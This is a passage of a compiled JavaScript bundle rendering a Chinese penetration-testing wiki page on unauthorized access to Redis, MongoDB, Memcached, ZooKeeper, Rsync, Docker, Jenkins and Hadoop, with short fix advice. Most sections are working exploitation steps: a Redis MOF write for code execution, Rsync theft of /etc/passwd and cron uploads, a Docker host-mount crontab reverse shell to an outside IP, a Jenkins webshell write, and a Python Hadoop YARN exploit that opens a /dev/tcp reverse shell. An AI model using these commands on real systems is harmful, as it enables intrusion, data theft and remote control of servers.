builtin class-name"}},[s._v("echo")]),s._v(" -e "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"nn"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" foo.txt\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" foo.txt "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" redis-cli -h "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.10 -x "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" mof\nredis-cli -h "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.10\nconfig "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" c:/windows/system32/wbem/mof/\nconfig "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename wintrysec.mof\nsave\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])]),t("h3",{attrs:{id:"修复建议"}},[s._v("修复建议 "),t("a",{staticClass:"header-anchor",attrs:{href:"#修复建议"}},[s._v("#")])]),s._v(" "),t("blockquote",[t("ul",[t("li",[s._v("使用强密码认证")]),s._v(" "),t("li",[s._v("降权运行 "),t("code",[s._v("g roupadd -r redis && useradd -r -g redis redis")]),s._v("，用低权限账户")]),s._v(" "),t("li",[s._v("限制"),t("code",[s._v("ip")]),s._v("禁止外网访问/修改默认端口   ( "),t("code",[s._v("redis.conf")]),s._v(" )")]),s._v(" "),t("li",[t("code",[s._v("Redis")]),s._v("默认不生成日志，可以自己"),t("a",{attrs:{href:"https://www.freebuf.com/column/158065.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("配置"),t("OutboundLink")],1)])])]),s._v(" "),t("p",[t("strong",[s._v("设置防火墙策略")])]),s._v(" "),t("p",[s._v("如果正常业务中"),t("code",[s._v("Redis")]),s._v("服务需要被其他服务器来访问，可以设置"),t("code",[s._v("iptables")]),s._v("策略仅允许指定的"),t("code",[s._v("IP")]),s._v("来访问"),t("code",[s._v("Redis")]),s._v("服务")]),s._v(" "),t("p",[t("strong",[s._v("保证 authorized_keys 文件的安全")])]),s._v(" "),t("p",[s._v("为了保证安全，应该阻止其他用户添加新的公钥。")]),s._v(" "),t("p",[s._v("将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限 ：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("400")]),s._v(" ~/.ssh/authorized_keys\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("为保证 authorized_keys 的权限不会被改掉，还需要设置该文件的 immutable 位权限")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("chattr +i ~/.ssh/authorized_keys\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("但是，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。")]),s._v(" "),t("p",[s._v("要避免这种情况，需要设置 ~./ssh 的 immutable 权限")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("chattr +i ~/.ssh\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"mongodb-未授权访问"}},[s._v("MongoDB 未授权访问 "),t("a",{staticClass:"header-anchor",attrs:{href:"#mongodb-未授权访问"}},[s._v("#")])]),s._v(" "),t("p",[s._v("MongoDB 默认是没有权限验证的，登录的用户可以通过默认端口无需密码对数据库任意操作(增删改高危动作)，而且可以远程访问数据库")]),s._v(" "),t("p",[s._v("1、验证")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("telnet 目标IP "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("27017")]),s._v("\nNavicat直接连接\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[s._v("2、修复建议")]),s._v(" "),t("ul",[t("li",[s._v("添加认证")])]),s._v(" "),t("h2",{attrs:{id:"memcached-未授权访问"}},[s._v("Memcached 未授权访问 "),t("a",{staticClass:"header-anchor",attrs:{href:"#memcached-未授权访问"}},[s._v("#")])]),s._v(" "),t("blockquote",[t("p",[s._v("Memcached 分布式缓存系统，默认的 11211 端口不需要密码即可访问，攻击者直接访问即可获取数据库中所有信息，造成严重的信息泄露")])]),s._v(" "),t("p",[s._v("1、验证")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("telnet 目标IP "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("11211")]),s._v("\n\nstats\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看memcache服务状态")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("2、修复建议")]),s._v(" "),t("ul",[t("li",[s._v("绑定的ip地址为 127.0.0.1限制为内网访问")]),s._v(" "),t("li",[s._v("或者通过firewall限制访问")])]),s._v(" "),t("h2",{attrs:{id:"zookeeper未授权访问"}},[s._v("Zookeeper未授权访问 "),t("a",{staticClass:"header-anchor",attrs:{href:"#zookeeper未授权访问"}},[s._v("#")])]),s._v(" "),t("p",[s._v("ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境")]),s._v(" "),t("p",[s._v("1、验证")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" envi"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" 目标IP "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2181")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("2、防护建议")]),s._v(" "),t("ul",[t("li",[s._v("添加认证")]),s._v(" "),t("li",[s._v("限制内网访问")])]),s._v(" "),t("h2",{attrs:{id:"rsync-未授权访问漏洞"}},[s._v("Rsync 未授权访问漏洞 "),t("a",{staticClass:"header-anchor",attrs:{href:"#rsync-未授权访问漏洞"}},[s._v("#")])]),s._v(" "),t("p",[s._v("Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，默认端口837。")]),s._v(" "),t("p",[s._v("1、漏洞利用")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#列举整个同步目录或指定目录：")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("rsync")]),s._v(" rsync://172.16.2.250:873/src\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#下载文件或目录到本地：")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("rsync")]),s._v(" rsync://172.16.2.250:873/src/etc/passwd ./\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#上传本地文件到服务端：")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("rsync")]),s._v(" -av "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" rsync://172.16.2.250:873/src/etc/cron.hourly\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#上传的文件可以直接是webshell或crontab反弹shell")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br")])]),t("p",[s._v("2、修复建议")]),s._v(" "),t("ul",[t("li",[s._v("添加认证")]),s._v(" "),t("li",[s._v("限制IP访问")])]),s._v(" "),t("h2",{attrs:{id:"docker未授权访问"}},[s._v("Docker未授权访问 "),t("a",{staticClass:"header-anchor",attrs:{href:"#docker未授权访问"}},[s._v("#")])]),s._v(" "),t("blockquote",[t("p",[s._v("docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker")])]),s._v(" "),t("p",[s._v("1、验证")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("docker -H tcp://10.1.1.211:2375 version\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#列出容器信息")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("target"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(":2375/containers/json\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("2、漏洞利用，反弹宿主机shell")]),s._v(" "),t("p",[s._v("新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'* * * * * /bin/bash -i >& /dev/tcp/10.1.1.214/1234 0>&1'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /mnt/var/spool/cron/crontabs/root\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("本地监听端口，获取宿主机shell")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("nc -lvp 1234\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("3、修复建议")]),s._v(" "),t("ul",[t("li",[s._v("对2375端口做访问控制")])]),s._v(" "),t("h2",{attrs:{id:"jenkins未授权访问"}},[s._v("Jenkins未授权访问 "),t("a",{staticClass:"header-anchor",attrs:{href:"#jenkins未授权访问"}},[s._v("#")])]),s._v(" "),t("p",[s._v("1、访问"),t("code",[s._v("http://www.xxx.com:8080/manage")])]),s._v(" "),t("p",[s._v("2、点击脚本命令行")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("println "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"whoami"')]),s._v(".execute"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".text\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("3、漏洞利用，写入webshell")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("new File "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/var/www/html/shell.php"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".write"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?php phpinfo(); ?>'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("4、修复建议")]),s._v(" "),t("ul",[t("li",[s._v("升级版本")]),s._v(" "),t("li",[s._v("添加认证、设置强密码复杂度及账号锁定")]),s._v(" "),t("li",[s._v("避免把Jenkins直接暴露在公网")])]),s._v(" "),t("h2",{attrs:{id:"hadoop-未授权访问"}},[s._v("Hadoop 未授权访问 "),t("a",{staticClass:"header-anchor",attrs:{href:"#hadoop-未授权访问"}},[s._v("#")])]),s._v(" "),t("p",[s._v("Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览、命令执行等操作，危害极大")]),s._v(" "),t("p",[s._v("1、验证")]),s._v(" "),t("p",[s._v("访问 "),t("code",[s._v("http://192.168.18.129:8088/cluster")])]),s._v(" "),t("p",[s._v("2、通过REST API命令执行")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("在本地监听端口 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" 创建Application "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" 调用Submit Application API提交\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#本地监听9999端口")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" -lvp "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("9999")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("3、EXP")]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#!/usr/bin/env python")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" requests\n\ntarget "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://192.168.18.129:8088/'")]),s._v("\nlhost "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'192.168.18.138'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# put your local host ip here, and listen at port 9999")]),s._v("\n\nurl "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" target "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ws/v1/cluster/apps/new-application'")]),s._v("\nresp "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("post"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\napp_id "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" resp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("json"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'application-id'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nurl "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" target "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ws/v1/cluster/apps'")]),s._v("\ndata "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'application-id'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" app_id"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'application-name'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'get-shell'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'am-container-spec'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'commands'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'command'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/bin/bash -i >& /dev/tcp/%s/9999 0>&1'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" lhost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'application-type'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'YARN'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\nrequests"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("post"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" json"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("data"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br")])])])}),[],!1,null,null,null);a.default=e.exports}}]);